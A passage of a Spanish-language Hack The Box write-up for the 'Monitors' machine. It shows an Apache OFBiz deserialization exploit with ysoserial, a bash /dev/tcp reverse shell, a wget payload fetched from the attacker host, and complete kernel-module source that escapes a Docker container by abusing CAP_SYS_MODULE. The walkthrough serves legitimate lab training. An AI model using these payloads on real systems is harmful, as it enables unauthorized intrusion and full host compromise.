+&lt;p&gt;De estos puertos, nos interesaremos en el puerto web (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8443&lt;/code&gt;), ya que está asociado a un servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt; accesible solo localmente. Para acceder a este puerto desde nuestro equipo, utilizaremos un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local port forwarding&lt;/code&gt;. El &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;local port forwarding&lt;/code&gt; es una técnica en la que redirigimos el tráfico de un puerto en nuestra máquina local a un puerto en la máquina remota a través de una conexión &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;SSH&lt;/code&gt;. Esto nos permite interactuar con servicios que están disponibles solo localmente en la máquina víctima, como en este caso, el servicio &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;HTTPS&lt;/code&gt; en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8443&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Para lograr esto, ejecutamos el siguiente comando:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ssh -L 8443:localhost:8443 marcus@10.10.10.238
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Este comando establece un &lt;em&gt;túnel SSH&lt;/em&gt;, redirigiendo el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8443&lt;/code&gt; en nuestra máquina local al puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8443&lt;/code&gt; de la máquina remota, que solo está disponible de forma local. Así, podemos acceder a este servicio desde nuestro navegador local, simplemente visitando &lt;a href=&quot;https://localhost:8443&quot;&gt;https://localhost:8443&lt;/a&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/50.png&quot; alt=&quot;50&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Con el &lt;em&gt;túnel SSH&lt;/em&gt; configurado, accedemos al puerto web local &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8443&lt;/code&gt; y comenzamos a explorar la aplicación. Al realizar un &lt;em&gt;fuzzing&lt;/em&gt;, descubrimos varias rutas interesantes.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wfuzz -c -L -t 400 --hc 404 --hh 800 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt https://localhost:8443/FUZZ
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/51.png&quot; alt=&quot;51&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entre ellas, la ruta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;main&lt;/code&gt; nos indica que podemos iniciar sesión usando el nombre de usuario &lt;em&gt;admin&lt;/em&gt; y la contraseña &lt;em&gt;ofbiz&lt;/em&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/52.png&quot; alt=&quot;52&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Sin embargo, las rutas &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;bi&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;example&lt;/code&gt; nos dirigen a un panel de autenticación en un sistema &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache OFBiz&lt;/code&gt;, donde, al intentar usar estas credenciales, recibimos un mensaje de que el usuario no existe. En este panel también se muestra la versión de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache OFBiz&lt;/code&gt;, la cual es &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;17.12.01&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/53.png&quot; alt=&quot;53&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Como lo hemos venido haciendo, podemos proceder a investigar si esta versión de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Apache OFBiz&lt;/code&gt; presenta alguna vulnerabilidad conocida que podamos explotar. Esto lo podemos hacer buscando en línea, en &lt;em&gt;Exploit Database&lt;/em&gt;, o directamente desde la consola con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;searchsploit&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;searchsploit ofbiz 17.12.01
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/54.png&quot; alt=&quot;54&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entre los resultados, encontramos un exploit que proporciona &lt;em&gt;ejecución remota de comandos&lt;/em&gt; (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;RCE&lt;/code&gt;) mediante un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ataque de deserialización&lt;/code&gt;. Aunque podríamos ejecutarlo directamente, resulta más valioso entender su funcionamiento para practicar el proceso de &lt;em&gt;deserialización&lt;/em&gt; y manipular el exploit manualmente, dándonos así un mayor control y comprensión del ataque.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/55.png&quot; alt=&quot;55&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Primero, descargaremos &lt;a href=&quot;https://github.com/frohoff/ysoserial&quot;&gt;ysoserial&lt;/a&gt;, una herramienta que nos permite generar objetos &lt;em&gt;Java&lt;/em&gt; serializados con payloads maliciosos. Esto resulta útil en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ataques de deserialización&lt;/code&gt;, donde al enviar un &lt;em&gt;objeto serializado&lt;/em&gt; especialmente diseñado, logramos ejecutar código en el servidor si este procesa (&lt;em&gt;deserializa&lt;/em&gt;) el objeto sin realizar una validación adecuada.&lt;/p&gt;
+
+&lt;p&gt;Luego, definimos una &lt;em&gt;reverse shell&lt;/em&gt; con un script &lt;em&gt;Bash&lt;/em&gt;. La &lt;em&gt;reverse shell&lt;/em&gt; nos permitirá obtener acceso remoto desde el servidor a nuestra máquina. Para esto, crearemos un archivo llamado &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt; con el siguiente contenido:&lt;/p&gt;
+
+&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;c&quot;&gt;#!/bin/bash&lt;/span&gt;
+/bin/bash &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt;&amp;amp; /dev/tcp/&amp;lt;nuestraIP&amp;gt;/443 0&amp;gt;&amp;amp;1
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/56.png&quot; alt=&quot;56&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;A continuación, generaremos el &lt;em&gt;payload&lt;/em&gt; en formato &lt;em&gt;JAR&lt;/em&gt;, usando la clase &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommonsBeanutils1&lt;/code&gt;. Esta clase es parte de &lt;em&gt;Apache Commons&lt;/em&gt; y se ha explotado en el pasado para ejecutar código de manera arbitraria en objetos serializados. Al utilizar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ysoserial&lt;/code&gt; junto con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CommonsBeanutils1&lt;/code&gt;, podemos incluir comandos en un objeto serializado que ejecutará el servidor al &lt;em&gt;deserializarlo&lt;/em&gt;. En este caso, el &lt;em&gt;payload&lt;/em&gt; está diseñado para que el servidor descargue nuestro archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt; en el directorio temporal (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;) de la máquina víctima. El output del &lt;em&gt;payload&lt;/em&gt; la codificamos en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; para facilitar su envío y evitar problemas de transmisión en el proceso:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java -jar ysoserial-all.jar CommonsBeanutils1 &quot;wget &amp;lt;nuestraIP&amp;gt;/shell.sh -O /tmp/shell.sh&quot; | base64 | tr -d &quot;\n&quot;; echo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/57.png&quot; alt=&quot;57&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Para que el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt; esté disponible y pueda descargarse en la máquina víctima, iniciaremos un servidor HTTP local con &lt;em&gt;Python&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;python3 -m http.server 80
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Con este servidor corriendo, ahora podemos enviar nuestro primer &lt;em&gt;payload&lt;/em&gt; al servidor de destino. Para ello, utilizaremos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt;, que enviará una solicitud al endpoint &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;webtools/control/xmlrpc&lt;/code&gt; en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;8443&lt;/code&gt;. Esta solicitud incluye el &lt;em&gt;payload&lt;/em&gt; codificado en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; dentro de la etiqueta &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;&amp;lt;serializable&amp;gt;&lt;/code&gt;. Al procesar la solicitud, el servidor deserializará el objeto y descargará el script de la &lt;em&gt;reverse shell&lt;/em&gt;.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d &quot;&amp;lt;?xml version=&apos;1.0&apos;?&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;ProjectDiscovery&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;&amp;lt;struct&amp;gt;&amp;lt;member&amp;gt;&amp;lt;name&amp;gt;test&amp;lt;/name&amp;gt;&amp;lt;value&amp;gt;&amp;lt;serializable xmlns=&apos;http://ws.apache.org/xmlrpc/namespaces/extensions&apos;&amp;gt; PAYLOAD &amp;lt;/serializable&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/member&amp;gt;&amp;lt;/struct&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;&quot; -k  -H &apos;Content-Type:application/xml&apos; &amp;amp;&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Aquí, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;PAYLOAD&lt;/code&gt; es el contenido &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt; que generamos en el paso anterior.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/58.png&quot; alt=&quot;58&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Después de enviar el &lt;em&gt;payload&lt;/em&gt; inicial para descargar &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt;, generaremos un segundo &lt;em&gt;payload&lt;/em&gt; en formato &lt;em&gt;JAR&lt;/em&gt; que ejecutará este archivo en el servidor. Este segundo &lt;em&gt;payload&lt;/em&gt; lo generaremos con el mismo proceso de codificación en &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64&lt;/code&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;java -jar ysoserial-all.jar CommonsBeanutils1 &quot;bash /tmp/shell.sh&quot; | base64 | tr -d &quot;\n&quot;; echo
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/59.png&quot; alt=&quot;59&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Antes de enviar este segundo &lt;em&gt;payload&lt;/em&gt;, pondremos nuestra máquina en escucha con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Netcat&lt;/code&gt; para recibir la reverse shell:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nc -nlvp 443
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+&lt;p&gt;Finalmente, enviamos el segundo payload utilizando &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;curl&lt;/code&gt; de la misma manera que el primero. Al ejecutarse esta solicitud, el servidor ejecutará el archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;shell.sh&lt;/code&gt; y obtendremos una &lt;em&gt;reverse shell&lt;/em&gt; dentro de la máquina víctima.&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d &quot;&amp;lt;?xml version=&apos;1.0&apos;?&amp;gt;&amp;lt;methodCall&amp;gt;&amp;lt;methodName&amp;gt;ProjectDiscovery&amp;lt;/methodName&amp;gt;&amp;lt;params&amp;gt;&amp;lt;param&amp;gt;&amp;lt;value&amp;gt;&amp;lt;struct&amp;gt;&amp;lt;member&amp;gt;&amp;lt;name&amp;gt;test&amp;lt;/name&amp;gt;&amp;lt;value&amp;gt;&amp;lt;serializable xmlns=&apos;http://ws.apache.org/xmlrpc/namespaces/extensions&apos;&amp;gt; PAYLOAD &amp;lt;/serializable&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/member&amp;gt;&amp;lt;/struct&amp;gt;&amp;lt;/value&amp;gt;&amp;lt;/param&amp;gt;&amp;lt;/params&amp;gt;&amp;lt;/methodCall&amp;gt;&quot; -k  -H &apos;Content-Type:application/xml&apos; &amp;amp;&amp;gt;/dev/null
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Una vez dentro de la máquina víctima, podemos confirmar nuestra presencia en el sistema mediante el comando:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;hostname -I
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Sin embargo, en lugar de estar directamente en la máquina víctima, nos encontramos dentro de un contenedor, con la dirección IP &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;172.17.0.2&lt;/code&gt;. Algo curioso es que, al ejecutar el comando &lt;em&gt;whoami&lt;/em&gt;, descubrimos que somos el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, lo que indica que tenemos privilegios de administrador dentro del contenedor.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/60.png&quot; alt=&quot;60&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Dado que somos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt;, el siguiente paso sería intentar escapar de este entorno. Como ya tenemos privilegios de administrador, podemos intentar realizar un &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;docker breakout&lt;/code&gt; para conseguir acceso a la máquina anfitriona y preservar nuestro estado como &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;root&lt;/code&gt; en el sistema de la víctima.&lt;/p&gt;
+
+&lt;p&gt;Por defecto, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Docker&lt;/code&gt; asigna ciertas &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;capabilities&lt;/code&gt; a los contenedores. Aunque el conjunto de &lt;em&gt;capabilities&lt;/em&gt; asignado es mínimo para dificultar la explotación, existen ciertas &lt;em&gt;capabilities&lt;/em&gt; que, si están presentes, pueden permitirnos escapar del contenedor. Podemos listar las &lt;em&gt;capabilities&lt;/em&gt; existente con el comando:&lt;/p&gt;
+
+&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;capsh --print
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/61.png&quot; alt=&quot;61&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Entre las &lt;em&gt;capabilities&lt;/em&gt; encontradas en el contenedor, identificamos &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_DAC_OVERRIDE&lt;/code&gt; y &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_MODULE&lt;/code&gt;, ambas que podríamos intentar abusar. Con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_DAC_OVERRIDE&lt;/code&gt;, podríamos escribir en el sistema de archivos de la máquina anfitriona. Sin embargo, para poder hacerlo, también debe estar presente la capability &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_DAC_READ_SEARCH&lt;/code&gt;, lo que no ocurre en este caso, por lo que esta vía de explotación no es posible. En cambio, podemos abusar de &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_MODULE&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;Esta capability permite a los procesos cargar y descargar &lt;em&gt;módulos del kernel&lt;/em&gt;, lo que significa que podemos inyectar código directamente en el &lt;em&gt;kernel&lt;/em&gt; del sistema anfitrión. Al permitir la ejecución de las llamadas al sistema, esta capability proporciona acceso directo al núcleo del sistema operativo. Dado que los contenedores se aíslan a nivel de sistema operativo (OS), pero comparten el &lt;em&gt;kernel&lt;/em&gt; con el anfitrión, este tipo de inyección nos permite interactuar con el &lt;em&gt;kernel&lt;/em&gt; de la máquina anfitriona a través del contenedor. Esto nos brinda la capacidad de comprometer totalmente el sistema al permitirnos alterar el &lt;em&gt;kernel&lt;/em&gt; y, por lo tanto, eludir todas las barreras de seguridad de Linux, incluidos los módulos de seguridad y la propia contención del contenedor.&lt;/p&gt;
+
+&lt;p&gt;Para aprovechar la capability &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;CAP_SYS_MODULE&lt;/code&gt; y escapar del contenedor, vamos a escribir un módulo de &lt;em&gt;kernel&lt;/em&gt; que abrirá una &lt;em&gt;reverse shell&lt;/em&gt; hacia nuestra máquina de atacante. Este módulo será compilado mediante un &lt;em&gt;Makefile&lt;/em&gt;, y luego se inyectará en el &lt;em&gt;kernel&lt;/em&gt; del sistema anfitrión para ejecutar el código.&lt;/p&gt;
+
+&lt;p&gt;El archivo &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;reverse-shell.c&lt;/code&gt; contiene el código del módulo de &lt;em&gt;kernel&lt;/em&gt;:&lt;/p&gt;
+
+&lt;div class=&quot;language-c highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;cp&quot;&gt;#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;linux/kmod.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+#include&lt;/span&gt; &lt;span class=&quot;cpf&quot;&gt;&amp;lt;linux/module.h&amp;gt;&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;
+&lt;/span&gt;
+&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;/bin/bash&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;-c&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;bash -i &amp;gt;&amp;amp; /dev/tcp/&amp;lt;nuestraIP&amp;gt;/4444 0&amp;gt;&amp;amp;1&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;NULL&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;};&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__init&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;reverse_shell_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;call_usermodehelper&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;envp&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;UMH_WAIT_EXEC&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;k&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;__exit&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;reverse_shell_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
+    &lt;span class=&quot;n&quot;&gt;printk&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;KERN_INFO&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;&quot;Exiting&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
+
+&lt;span class=&quot;n&quot;&gt;module_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reverse_shell_init&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;span class=&quot;n&quot;&gt;module_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;reverse_shell_exit&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
+&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
+
+&lt;p&gt;Este código define un módulo de &lt;em&gt;kernel&lt;/em&gt; que utiliza la función &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;call_usermodehelper&lt;/code&gt; para ejecutar el comando de &lt;em&gt;reverse shell&lt;/em&gt; en el sistema anfitrión. Al inicializar el módulo (reverse_shell_init), se ejecuta el comando que abrirá una conexión de &lt;em&gt;reverse shell&lt;/em&gt; hacia nuestra IP en el puerto &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;4444&lt;/code&gt;.&lt;/p&gt;
+
+&lt;p&gt;&lt;img src=&quot;https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/62.png&quot; alt=&quot;62&quot; class=&quot;blog-image&quot; onclick=&quot;expandImage(this)&quot; /&gt;&lt;/p&gt;
+
+&lt;p&gt;Por otro lado, el Makefile automatiza el proceso de compilación del módulo:&lt;/p&gt;
+
+&lt;div class=&quot;language-make highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nv&quot;&gt;obj-m&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+=&lt;/span&gt;reverse-shell.o
+
